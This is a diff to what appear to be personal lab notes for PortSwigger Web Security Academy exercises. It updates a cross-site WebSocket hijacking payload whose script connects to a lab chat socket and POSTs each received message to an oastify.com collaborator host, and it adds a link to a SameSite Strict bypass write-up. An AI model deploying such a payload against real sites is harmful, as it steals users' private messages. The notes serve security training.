@@ -15,15 +15,20 @@
 **Payload** :
 ```html
 <script>
-    var ws = new WebSocket('wss://0ad900510342e3d880210306003700dd.web-security-academy.net/chat');
+    var ws = new WebSocket('wss://0a0100510427225980f194a900390099.web-security-academy.net/chat');
     ws.onopen = function() {
         ws.send("READY");
     };
     ws.onmessage = function(event) {
-        fetch('https://z22cj2artgkd3e4s2j5zipjnue05ovck.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+        fetch('https://j5ptbath534duodoqnzgokqqghm8azyo.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
     };
 </script>
 ```
+
+### SameSite Strict bypass via sibling domain
+Just Read the write up
+https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
+
 
 
 
